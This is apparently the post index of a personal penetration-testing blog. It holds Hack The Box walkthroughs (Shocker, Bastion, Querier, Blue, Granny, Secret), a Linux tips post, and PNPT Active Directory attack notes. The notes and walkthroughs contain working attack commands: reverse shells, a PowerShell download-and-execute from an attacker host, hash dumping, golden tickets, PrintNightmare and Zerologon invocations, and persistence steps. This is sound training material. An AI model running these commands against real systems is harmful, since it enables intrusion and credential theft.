CGI-bins, we learn that it is often vulnerable to the shellshock vulnerability if the version of bash is old enough. The reason this exploit works with CGI is because the web server is passing user supplied data into the shell script as environment variables, stuff like user agent, cookies, or other GET parameters. By inserting the shell shock payload followed by a command into one of these variables, we can get RCE on the box. Let’s try it with this one-liner I found on github.We can see that by putting the shell shock payload into the ‘user-agent’ field, we can execute commands. We’ll send this over to burp and play around with it more.When we remove the echo; echo; line, the command doesn’t work.Putting 1 echo back makes it work again.It also won’t work if we don’t specify the full path of the command, or use /bin/bash -c ‘command’ as shown earlierFootholdAnyways, let’s get a reverse shell. Set up a listener and throw a reverse shell one liner for bash at the server.We get a reverse shell as Shelly. Checking our sudo priveleges on the box gives us:We have access to run perl as root, meaning we are 1 quick search on GTFO bins away from root.Using the first one gives us a root shell." }, { "title": "Bastion", "url": "/posts/Bastion/", "categories": "htb", "tags": "Windows, Outdated Software, Weak Credentials, Password Cracking, Powershell, Hash Capture, Anonymous Access", "date": "2023-01-15 09:30:00 -0600", "snippet": "Bastion is a straight forward easy-level machine on HacktheBox that starts with enumerating a .vhd backup file that we mounted from an SMB share through anonymous login, from there we dump the user hash using Impacket’s SecretsDump. To privesc, we struggle running automated tools and running into issues with UAC until we discover that one of the applications downloaded on the machine stores an encrypted administrator password, which we can crack and use to SSH into the box to get an adminstrator shell.EnumerationNmap 7.93 scan initiated Fri Jan 13 14:49:08 2023 as: nmap -sC -sV -p- -oN nmap.out 10.10.10.134Nmap scan report for 10.10.10.134Host is up (0.073s latency).Not shown: 65511 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)| ssh-hostkey: | 2048 3a56ae753c780ec8564dcb1c22bf458a (RSA)| 256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA)|_ 256 935f5daaca9f53e7f282e664a8a3a018 (ED25519)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found15757/tcp filtered unknown17960/tcp filtered unknown21231/tcp filtered unknown21589/tcp filtered unknown32195/tcp filtered unknown38545/tcp filtered unknown47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPC54345/tcp filtered unknown55758/tcp filtered unknown58718/tcp filtered unknown63412/tcp filtered unknown63731/tcp filtered unknownService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsNmap tells us that this is a Windows server with SSH open, this information combined with the name “Bastion” leads us to believe that we will be attacking some type of jumpbox. Let’s check out SMB.Listing shares with the -L option, we see a backups folder, which is certainly not standard, let’s mount the entire drive to our machine so we can enumerate it further.Looking around the mounted files, we can find the User name “L4mpje”, as well as 2 .vhd backup files that we can mount and enumerate further. We run this command (as root) in order to see it’s contents.guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd/If we do this with both vhd files, we can see that one of them represents the boot partition, and the other is the actual contents on the drive. Let’s ignore the boot partition and continue on with the actual files.We can see that we are in the C:\\ directory of a windows machine.Located in C:\\Windows\\System32\\Config\\,The SAM and SYSTEM files are particularly juicy, as they contain hashes for users on the box, and are typically only readable by the administrator account, however since we’re viewing a backup, we can use Impackets-Secretsdump to dump these hashes locally.We can crack these hashes with John or Hashcat to return the password.FootholdSeems like the Administrator password doesn’t want to be cracked, but we got L4mpje’s password nonetheless. Let’s SSH into the box.From here we can try running the automated tools that we usually do, like winPEAS, Sherlock.ps1, PowerUp.ps1, but they’ll get permission denied due to the UAC on the box (user access control). Looking around for recently installed programs, we see something in the Program Files (x86) folder.mRemoteNG is an open source software used by sysadmins/IT folk to manage remote connections, which goes along with the theme of this being a bastion host. We can find out on google that this application stores encrypted credentials in the %APPDATA%mRemoteNG folder in a file named confCons.xml, and this can sometimes be the admin password. Let’s check it out with type %appdata%\\mRemoteNG\\confcons.xmlWe can grab the encrypted password and use a tool called mRemoteNG-Decrypt to decrypt the string.using this password, we can ssh into the box as administrator." }, { "title": "Querier", "url": "/posts/Querier/", "categories": "htb", "tags": "Windows, MSSQL, Outdated Software, Weak Credentials, Password Cracking, Powershell, Hash Capture", "date": "2023-01-10 14:00:00 -0600", "snippet": "Querier is a medium level machine on HacktheBox that starts with discovering database credentials in the macros of a xlsm file on a network share. We can then login to the database as a low privelege user, and send the database service hash to our listener on responder using a nice trick from hacktricks. We crack the hash and login to the database with new credentials, which lets us enable xp_cmdshell and execute commands on the box. We finally escalate priveleges with help from the PowerUp.ps1 script.EnumerationResults of nmap showHost is up (0.051s latency).Not shown: 996 closed tcp ports (reset)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)|_ssl-date: 2023-01-10T20:04:25+00:00; 0s from scanner time.|_ms-sql-info: ERROR: Script execution failed (use -d to debug)| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2023-01-10T20:01:25|_Not valid after: 2053-01-10T20:01:25Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2023-01-10T20:04:21|_ start_date: N/A| smb2-security-mode: | 311: |_ Message signing enabled but not requiredService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 21.63 secondsWe can use SMBmap with no username to see if we have anonymous access and list the shares.Reports is non-standard on Windows, meaning some body made this share. Let’s check it out.We can download this Currency Volume Reports file and see if it gives us any info.Right off the bat we are hit with a blank file and a security warning that the document contains macros. Checking the macros reveals a “connect” function, which contains credentials for a service account.FootholdLogin to the mssql service on port 1433 with the credentials,and remember to use the -windows-auth flag.We can see that the credentials are valid for the database, however we don’t have the privileges required to execute commands, and there’s nothing else that we can see here that’s interesting. Let’s check out a trick from Hacktricks. If we set up a SMB server using responder or impacket, we can potentially steal the netNTLM hash of the database.Cracking this hash gives us the credentials mssql-svc:corporate568 , which we can use to login to the database again to see if we have more privileges this time around.We are able to execute commands as the service account now. Let’s get a reverse shell and enumerate the box. We host the Nishang powershell reverse shell on a web server and download it from the victim machine using xp_cmdshell echo IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.9/rev.ps1\") | powershell -noprofile and our web server gets a hit from the box, and then we get a hit on our netcat listener.Priv Escwe can upload PowerUp.ps1 in the same way and run Invoke-AllChecksWhich gives admin credentials that were located in the C:\\Windows\\Panther\\Unattend.xml fileUsing these credentials in psexec gives us a system shell.Let’s check another way we can root this box." }, { "title": "The Way of the Console Cowboy", "url": "/posts/ConsoleCowboy/", "categories": "General", "tags": "Linux", "date": "2023-01-10 10:30:00 -0600", "snippet": "Tips and Tricks for Navigating LinuxtmuxTmux is a powerful screen multiplexer, meaning it lets you handle multiple panes in a command line interface, which is super useful for sys-admin tasks, hackthebox, and really anything on linux that involves multitasking. I found myself using it alot in my time as a linux admin when handling multiple remote SSH connections to various servers, and it is a fantastic tool.To start a new tmux session in your current directory,type tmux new -s &lt;name&gt;The default prefix key for tmux commands is ctrl+bTo open a new window in tmux, press prefix+cSwitch between tmux windows with prefix+&lt;Window #&gt;To rename a tmux window, prefix+,To detatch from your tmux session, press prefix+dList tmux sessions with tmux lsJoin a tmux session with tmux attach -t &lt;session name&gt;Horizontally split your terminal with prefix+\"Vertically split your terminal with prefix+%Move between split panes using prefix+&lt;arrow key&gt;Zoom in and out of split panes using prefix+zTo adjust the size of split panes use prefix+&lt;hold arrow key&gt;To switch the position of panes use prefix+{ or prefix+}To cycle through different layouts of panes use prefix+&lt;space bar&gt;Grep Grep is a very powerful command line tool used to find matching patterns. You can use it to find a file in a directory, to find a specific string inside of a file, or you can even use it on the output of another command with the character. The basic syntax of a grep command is grep [options] [pattern] [file]So, to find a file within a directory, you can usels [/path/to/directory/] | grep [pattern]Because linux is case sensitive, you can use the -i flag to grep for results in a non case sensitive fashion, as suchgrep -i [pattern] [/path/to/file.txt]To make grep search through files recursivly in a directory, typegrep -r [pattern] [/path/to/directory/]To make grep invert the sense of matching, and exclude a specific pattern, use the -v flaggrep -v [pattern] [/path/to/directory/]There are tons more flags and options for grep, but these are a few that I find myself using most often. These can also be chained together to do more cool stuff. For example,ls /var/www | grep -iv configWill search for file names within the /var/www/ directory that do not contain config. To view the full power of grep, you can always useman grepVimVim is a powerful text editor, and is ubiquitous accross linux systems. One of the mottos of Vim is “edit at the speed of thought”, and vim really is it’s own language.Opening a vile with vim &lt;file&gt; will enter you in read-only normal mode. To edit the file, press i to enter insert mode, and hit esc to exit insert mode. Some useful shortcuts include:x : Cut Characterdw : cut worddd : cut full lineyw : copy wordyy : copy full linep : pasteYou can multiple any command to run multiple times by adding a number before it, 4yw will copy 4 words for example.You can hit : to enter command mode, some basic ones include:1 : jump to the first line:w : write (save):q : quit:q! : force quit (without saving):wq : write and quit" }, { "title": "PNPT Notes", "url": "/posts/PNPT/", "categories": "notes", "tags": "pnpt", "date": "2022-11-06 12:19:00 -0600", "snippet": "Active Directory AttacksLLMNR PoisoningLink local multicast name resolution, used when DNS fails to resolve a hostname, can be an easy win if LLMNR is not disabled in the environment and users have weak credentials. Use responder from the impacket suite to listen on an interface, works better at times with high traffic..Python responder.py -I eth0 -rdwvIf certain events occur, you can obtain a username and NTLM hash, which can be cracked with john or hashcat.john --wordlist=/path/to/rockyou.txt /path/to/hash.txthashcat -m 5600 /path/to/hash.txt /path/to/rockyou.txt (5600 is the module for NTLMv2)Hashcat binary can be downloaded here, and should be ran on base OS.Defending against LLMNR attacksBest defense against this attack is to simply disable LLMNR and NBT-NS, if they can not be disabled then strong access controls and strong passwords should be enforced on the network.SMB Relay AttacksInstead of cracking the hash, we can also use it to gain access to a machine if our stolen user hash represents a local admin on the target machine. SMB signing must be disabled for this to work.Edit the responder.conf file and turn off SMB and HTTP servers, run responder –&gt; responder is only capturing hashes, ntlmrelayx will do the actual relay.python ntlmrelayx.py -tf targets.txt -smb2supportCan dump the SAM file –&gt; get access to local user hashes.Add -i argument to get an interactive shell spawned on your machine. “started interacvtive SMB client shell via TCP on localhost:11000” -&gt; use netcat to interract, can view/modify/Enumerating hosts with SMB signing disablednmap --script=smb2-security-mode.nse -p 445 192.168.1.0/24Disabled by default on workstations, enabled and required by default on servers. enabled but not required = vulnerable.Defending against SMB relay attacksEnable SMB signing on all devices, disable NTLM authentication, account tiering (least priv.), local admin restriction.IPv6 AttacksClone MiTM6 and run “pip3 install” in the directory.Starting by runningmitm6 -d domain.localand concurrently runntlmrelayx.py -6 -t ldaps://dc.ip.add.res -wh fakewpad.domain.local -l lootmeVery extensive tool, can create new users/update ACLs, dump creds, gather info, etc.Post Compromise EnumerationPowerViewDownload on victim machine, and runpowershell.exe -ep bypass.\\PowerView.ps1Get-NetDomain - gives general information about the domain, forest name, DCs, etc.Get-NetDomainController - gives more specific information about the DCs, IP addresses, names, etc.Get-DomainPolicy - can see GPs on the domain, Kerberos, System Access, version,(Get-DomainPolicy)”system access” - can see the system access policies: min. password age, password complexity, password length, etc.Get-NetUser - dumps info on all users Get-NetUser select cn - will give users Get-NetUser select samaccountname - will give account names Get-UserProperty - lists all potential user propertiesGet-UserProperty -Properties pwdlastset - will show when all users had their passwords last resetGet-UserProperty -Properties logoncount - can potentially find honeypot accounts with low logon #sGet-NetComputer - will list all computersGet-NetComputer -FullData - will dump tons of info about all computers Get-NetComputer -FullData select OperatingSystem - will show all computer operating systems Get-NetGroup - shows groupsGet-NetGroup -GroupName “Domain Admins”Get-NetGroupMember -GroupName “Domain Admins”Invoke-ShareFinder - SMB enumGet-NetGPO Get-NetGPO select displayname, whenchanged BloodhoundDownloads data from AD and displays it in GUI, figures out shortest path to DA.apt install bloodhound;neo4j console;bloodhoundAfter changing the default password, you can start pulling data from the environment by downloading sharphound on the victim machine.powershell -ep bypass.\\SharpHound.ps1Invoke-Bloodhound -CollectionMethod All -Domain Domain.local -ZipFileName file.zipTransfer the file to attack machine, and upload it to bloodhound.Post Compromise AttacksPass the Hash / Passcrackmapexec 10.10.10.0/24 -u user -d DOMAIN -p passwordWill spray the network with the user’s creds, can be done with the user’s password hash as well.crackmapexec smb 10.10.10.0/24 -u \"user\" -H hash --local-authorpsexec.py \"user\":@ipaddress -hashes &lt;hash&gt;Dumping Hashes with secretsdump.pysecretsdump.py domain/user:pass@ipaddresscan dump SAM hashes, LSA secrets, api keys.hashcat64.exe -m 1000 hashes.txt rockyou.txt-m 1000 is for NTLMToken ImpersonationA token is a temporary key that allows you to access a system or network without having to provide creds for every action you take.There are 2 types of tokens: Delegate- Created for logging into a machine or using RDP Impersonate- “Non-interactive” such as attaching a network drive or a domain logon script.How to do it with metasploit-msfconsoleuse exploit/windows/smb/psexecset rhosts &lt;dc ip address&gt;set smbdomain &lt;domain.local&gt;set smbpass &lt;pass&gt;set smbuser &lt;user&gt;show targetsset target 2set payload windows/x64/meterpreter/reverse_tcpset lhost eth0runIf all is good, you’ll be in a shell, lots of tools we can load like mimikatz, powershell, incognito. If a user has logged into the machine, you may be able to impersonate them with their token using incognito.load incognitolist_tokens -uimpersonate_token &lt;domain&gt;\\\\&lt;user&gt;shellwill place you in a shell as the new user.rev2selfto revert to your original shell.KerberoastingHow Kerberos works - suppose a user is attempting to access an application server. User requests a TGT (Ticket Granting Ticket) from the domain controller (key distribution center), the KDC verifies the username and NTLM hash. If the credentials are valid, the user receives TGT from the DC, encrypted with the krbtgt hash. The user provides the TGT back to the DC, this time requesting a TGS (Ticket Granting Service Ticket) DC verifies TGT by decrypting with it’s own hash, then sends the user a TGS encrypted with the application server’s hash. User sends the encrypted TGS to the application server, who can decrypt it with it’s own hash and authenticate the user. User and Application server have now mutually authenticated each other securely, good job Microsoft!In short, valid creds -&gt; TGT -&gt; TGS -&gt; access to serviceInstead of using the TGS to authenticate to a server, we can crack the hash and BECOME the server.python GetUserSPNs.py domain.local/user:pass -dc-ip &lt;dc ip&gt; -requestRequests a service ticket and sends you the hash, which can be cracked with hashcat (-m 13100 for krb-TGS). Because we are exploiting a feature of Kerberos, you can not prevent this attack; it can only mitigated with strong passwords (30 characters+ for service accounts) and following the rules of least privilege.GPP / cPassword AttacksGroup Policy Preferences allowed admins to create policies using embedded credentials. These creds would be encrypted and placed in the “Groups.xml” file, which resides in the SYSVOL folder and can be read by any user. This file will contain the encrypted “cPassword”, which can be decrypted easily using gpp-decrypt (default on Kali). Can use Invoke-GPP to check for this automatically. Always look for this on older servers, could be an easy win.URL AttacksNeed access to a file share to do this, either through a user account (post exploit) or on a wide open share (less likely). Make a file that contains this-[InternetShortcut]URL=whateverWorkingDirectory=whateverIconFile=\\\\&lt;attackbox IP&gt;\\%USERNAME%.iconIconIndex=1The name of the file is important, it must start with an @ or ~ to ensure that it is placed alphabetically at the top of the directory, and must end with the .url extension. The name should be something relevant to the company - “@Q4 financials.url”. Save as type “all files”. When users navigate to the directory, their hash will be sent over to the attackbox, which can be picked up with a responder listener.Print Nightmare (CVE-2021-1675)Use rpcdump.py from impacket to scan for potentially vulnerable hosts.If it returns a value, it could be vulnerable.rpcdump.py @&lt;Victim IP&gt; | egrep 'MS-RPRN|MS-PAR'use msfvenom to generate a payload and msfconsole to set the listenermsfvenom -p windows/x64/windows/reverse_tcp LHOST=&lt;listener IP&gt; LPORT=&lt;port&gt; -f dll &gt; shell.dllmsfconsoleuse multi/handleroptionsset payload windows/x64/windows/reverse_tcpoptionsset lport &lt;lport&gt;set lhost &lt;listener IP&gt;runNow we need to host our dll so the target can reach itsmbserver.py share 'pwd' -smb2supportNow we just need a user/pass combination (does not have to be administrator).python3 CVE-2021-1675.py domain.local/&lt;user&gt;:&lt;password&gt;@&lt;dc ip&gt; '\\\\&lt;attack box IP&gt;\\share\\shell.dll' Should get a meterpreter shell on your listener, can proceed with the usual, getuid, hashdump, etc. Most AV will pick up the shell.dll if you don’t obfuscate it in some way.MimikatzA tool built in C used to steal credentials, generate Krb tickets, and leverage attacks such as pass the hash, pass the ticket, golden ticket, etc. Very extensive tool. Use on DC post compromise.mimikatz.exeprivilege::debug“Privilege ‘20’ OK” -&gt; good to gosekurlsa::logonpasswordsWill show computer username/NTLM hash for it, as well as any user who has logged in since last reboot, dumps this information from memory. Can pass the computer’s NTLM hash (not v2) and see if it gives access anywhere on the domain. If a DA has logged into the computer, you can potentially pass their hash or try to crack it.lsadump::samorlsadump::sam /patchDoesn’t always work, can try different ways, metasploit, secretsdump, etc.lsadump::lsa /patchLSA= local security authority, dumping it will show usernames/ntlm hashes.Golden Ticket attack with MimikatzGolden ticket = complete access to the ENTIRE domainmimikatz.exelsadump::lsa /inject /name:krbtgtNeed to grab 2 things from the output:S-ID of the domain (looks like S-1-5-32-1045337234-12924708993-5683276719-19000)NTLM hash of the Krbtgtkerberos::golden /User:Administrator /domain:&lt;domain.local&gt; /sid:&lt;SID&gt; /krbtgt:&lt;krbtgt ntlm hash&gt; /id:500 /pttid 500 is associated with Admin, and /ptt specifies pass the ticket. Output should say “golden ticket for ‘Administrator @ ' successfully submitted for current session\"misc::cmddir \\\\&lt;machine&gt;\\&lt;drive&gt; jkhdforpsexec.exe \\\\&lt;machine&gt; cmd.exeGolden ticket can be used for persistence as well.Zero LogonCVE-2020-1472. Dangerous attack to run in an environment, sets the DC password to null, if you don’t reset the password you can break the server../zerologon_tester.py &lt;DC netbios name&gt; &lt;DC IP&gt;python3 cve-2020-1472-exploit.py &lt;DC netbios name&gt; &lt;DC IP&gt;Use hexpass and restorepassword.py to restore the DC. Easy attack to pull off, scary in the real world.Post ExploitationFile TransfersCertutilcertutil.exe -urlcache -f http://&lt;attackbox IP&gt;/malicious.txt malicious.txtFTPpython -m pyftpdlib 21ftp &lt;attacker ip&gt;Meterpreter shell also has built in ways to upload/download files.Maintaining AccessPersistence Scripts:run persistence -hexploit/windows/local/persistenceexploit/windows/local/registry_persistenceScheduled Tasksrun schedulemerun schtaskabuseAdd a Usernet user username password /addPivotingmsfconsoleuse exploit/windows/smb/psexecoptionsset rhosts &lt;victim ip&gt;set smbpass &lt;password&gt;set smbuser &lt;user&gt;set payload windows/x64/meterpreter/reverse_tcpset lhost &lt;interface&gt;set target 2runshellroute printarp -a^C yrun autoroute -s &lt;unreachable subnet&gt;/24run autoroute -pbackgroundproxychains, chisel, ssh, lots of different tools.Clean upMake the system as it was when you entered it: remove executables, scripts, added files or users, malware, rootkits, and revert settings to their original configuration.Web ApplicationsEmail Enumerationhunter(.)iophonebook(.)cztools(.)verifyemailaddress(.)ioSubdomain Enumerationsublist3r -d corp(dot)comcrt(.)sh %.corp.com, does certificate fingerprinting.Asset Findergo get -u github.com/tomnomnom/assetfinder (Use pimpmykali to fix Go first)assetfinder domain.com &gt;&gt; output.txtAmassexport GO111MODULE=ongo get -v -u github.com/OWASP/AMmass/v3/...amass enum -d domain.com &gt;&gt; subs.txthttprobe checks if domains are upgo get -u github.com/tomnomnom/httprobecat subdomains.txt | httprobe -s -p https://443Host Discoverynetdiscover -r x.x.x.0/24 will sweep an entire subnet.OWASP top 10 Injection Broken Authentication Sensitive Data Exposure XML External Entities (XXE) Broken Access Control Security Misconfiguration Cross-Site Scripting Insecure Deserialization Using Components with Known Vulnerabilities Insufficient Logging and Monitoring Windows Privilege EscalationInitial EnumerationSysteminfo command will show basic systeminfo, can refine it more withsysteminfo | findstr /B /C:\"OS NAME\" /C:\"OS VERSION\" /C:\"System Type\"Can see what version of windows is running, what architecture, etc.wmic qfe get Caption,Description,HotFixID,InstalledOnWill show information regarding latest updates.wmic logicaldisk get caption,description,providernameWill show drives availableUser Enumerationwhoami /groups and net user are good ones to run, net localgroup, net localgroup administratorsNetwork EnumerationIpconfig /all , basic network info, might give info on domain.arp -a and route print also give good infonetstat -anoPassword Huntingfindstr /si password *.txt , *.ini *configAV Enumerationsc query windefendWill show if Windows Defender is runningsc queryex type= serviceWill show all services running on machine.netsh advfirewall dumpornetsh firewall show stateWill show firewall information.netsh firewall show configShows firewall configrun post/multi/recon/local_exploit_suggester - random metasploit infoKernel ExploitsKernel is a program that controls everything in the system. Facilitates interactions between hardware and software components, acts as a translator.https://github(.)com/SecWiki/windows-kernel-exploits```msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=" }, { "title": "Blue", "url": "/posts/Blue/", "categories": "htb", "tags": "Windows, Public Vulnerabilities, Eternal Blue, SMB", "date": "2022-10-03 12:04:00 -0500", "snippet": "Blue is an easy level Windows machine on Hack the Box featuring the notorious CVE-2017-0143, which was used in the “WannaCry” ransomware attacks. Due to the nature of this vulnerability, it’s a pretty straight forward route from boot to root. That being said, this vulnerability will always have a historical significance as it is theorized to have been developed by the NSA, and it’s unintended release led to massive waves of ransomware attacks globally, or so the story goes.EnumerationAnyways, we run an NMAP on the target which shows us:sudo nmap -sC -sV 10.10.10.40[sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-03 12:22 CDTNmap scan report for 10.10.10.40Host is up (0.051s latency).Not shown: 991 closed tcp ports (reset)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPC49157/tcp open msrpc Microsoft Windows RPCService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-10-03T17:23:10|_ start_date: 2022-10-03T17:04:45| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.1: |_ Message signing enabled but not required| smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)| OS CPE: cpe:/o:microsoft:windows_7::sp1:professional| Computer name: haris-PC| NetBIOS computer name: HARIS-PC\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2022-10-03T18:23:12+01:00|_clock-skew: mean: -19m57s, deviation: 34m36s, median: 0sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 71.95 secondszsh: segmentation fault sudo nmap -sC -sV 10.10.10.40Our trusty nmap scripts found the OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1), and a bunch of other information about SMB on the machine. Running another nmap, this time specifying to use the vuln scripts on port 445:$ sudo nmap -script vuln -p445 10.10.10.40 [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-03 12:47 CDTPre-scan script results:| broadcast-avahi-dos: | Discovered hosts:| 224.0.0.251| After NULL UDP avahi packet DoS (CVE-2011-1002).|_ Hosts are all up (not vulnerable).Nmap scan report for 10.10.10.40Host is up (0.051s latency).PORT STATE SERVICE445/tcp open microsoft-dsHost script results:| smb-vuln-ms17-010: | VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE| IDs: CVE:CVE-2017-0143| Risk factor: HIGH| A critical remote code execution vulnerability exists in Microsoft SMBv1| servers (ms17-010).| | Disclosure date: 2017-03-14| References:| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/| https://technet.microsoft.com/en-us/library/security/ms17-010.aspx|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND|_smb-vuln-ms10-054: falseNmap done: 1 IP address (1 host up) scanned in 50.15 secondszsh: segmentation fault sudo nmap -script vuln -p445 10.10.10.40We can see that this version of SMB is vulnerable to CVE-2017-0143, which allows an unauthenticated user remote code execution. This vulnerability is more popularly known as EternalBlue (ms17-010), and you will see now why it is classified as a high severity vulnerability.Using msfconsole, we search “ms17-010” and select a payload.Once we’ve set the listener and remote host ip addresses, we’re ready to go.In just a few commands, and with 0 technical prowess, we’ve gone from unauthenticated user to system level access on the machine." }, { "title": "Granny", "url": "/posts/Granny/", "categories": "htb", "tags": "Windows, WebDav, ASP, IIS, Public Vulnerabilities", "date": "2022-10-01 15:19:00 -0500", "snippet": "Granny is an easy level Windows machine on Hack the Box, we begin with attacking an outdated web server and tricking it into executing our reverse shell payload. From there we escalate privileges on the machine through.EnumerationAs always we start with an NMAP to scan for open ports on the target.nmap -sC -sV 10.10.10.15and the output shows us-PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 6.0| http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT|_http-title: Under Construction| http-ntlm-info: | Target_Name: GRANNY| NetBIOS_Domain_Name: GRANNY| NetBIOS_Computer_Name: GRANNY| DNS_Domain_Name: granny| DNS_Computer_Name: granny|_ Product_Version: 5.2.3790|_http-server-header: Microsoft-IIS/6.0| http-webdav-scan: | Server Date: Sat, 01 Oct 2022 20:23:34 GMT| Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK| Server Type: Microsoft-IIS/6.0| Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH|_ WebDAV type: UnknownService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsWe see a single port, 80, running IIS 6.0. From this version number we know the target is a 2003 Windows Server, and nmap scripts also show us that WebDav is enabled and we can potentially PUT (upload) files and execute them. We’ll use davtest to see which methods are allowed on the server.We can see that davtest could upload html,txt,jhtml,jsp,cfm,pl,and php files, however it could only execute html and txt files. Let’s use burp and see if we can gather any more information from the http headers.We can see from the response headers that this server is powered by ASP, and we know that msfvenom supports this format.FootholdSo we’ll use msfvenom to create our payload using the windows/meterpreter/reverse_tcp payload in the aspx format, and we’ll use another tool called cadaver to upload it to the target.Trying to upload it with the aspx extension gives us a forbidden error.We’ll need to trick the web server into accepting our file and executing it.We can visit the endpoint on the site to see if our file was uploaded successfully.Looks good, but we need to get the web server to execute it somehow.We can use cadaver again to “move” our file from dusa.txt to dusa.aspx, bypassing the forbidden error we received earlier. We can set up our netcat listener now and when we navigate to the aspx file, the connection hangs, and a reverse shell pops up-We are on the machine now as “network service”.Privilege EscalationLet’s enumerate our user’s permissions and try to find a PrivEsc vector." }, { "title": "Secret", "url": "/posts/Secret/", "categories": "htb", "tags": "Linux, Source Code Review, Javascript, Git, Web API, Command Injection, Weak Authentication, SUID Exploitation", "date": "2022-08-14 15:16:00 -0500", "snippet": "Secret is an easy level machine (supposedly) on HacktheBox, though I found it to be much more challenging than most other easy machines. The website on the machine features a live API, documentation for it, and a download for it’s source code. In the source code, we see that the api uses JWT tokens to authenticate users, and by viewing the git commit history we steal the token secret and use it to forge our own admin token. We then discover an authenticated RCE in the source code and use it to drop our SSH key onto the box and grab the user flag. From there we ultimately get the root flag through exploiting a file wih a custom SUID bit by running the program, crashing it, and reading the crashdump.Enumeration$ sudo nmap -sC -sV 10.10.11.120[sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 21:15 EDTNmap scan report for 10.10.11.120Host is up (0.055s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)| 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)|_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: DUMB Docs|_http-server-header: nginx/1.18.0 (Ubuntu)3000/tcp open http Node.js (Express middleware)|_http-title: DUMB DocsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNmap shows us SSH on 22, and 2 HTTP servers on 80 and 3000.It also appears that the same content is being hosted on both web sites, however from the service scan we see that port 80 is running nginx and port 3000 is running Node.js, which might be important to note, or it might not.From either site we can see links to different sections of the documentation, and a download for the source code at the bottom.Just in case, we’ll run dirb to look for any other directories while we look around and read the documentation.dirb http://10.10.11.120/ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txtFrom the site’s documentation, we can see a demonstration of how to use the api to register a user on the /api/user/register endpoint.Let’s fire up burpsuite and give it a try.Because we don’t have a content type set, the server is expecting “name=” in the body of the POST request. however since we are submitting a json we need to add the “Content-Type: application/json” header in order to submit the request to the server properly.Success! Kind of. Submitting a longer username and password this time lets us create a user and get the expected response that was shown in the documentation.Moving on in the documentation, we can see that after creating a user, we can login at /api/user/login to get a JWT token.Let’s try ourselves.If you are an administrator, you can verify at /api/priv by sending your token.If you are a normal user, you will get this returned.However, if you are not 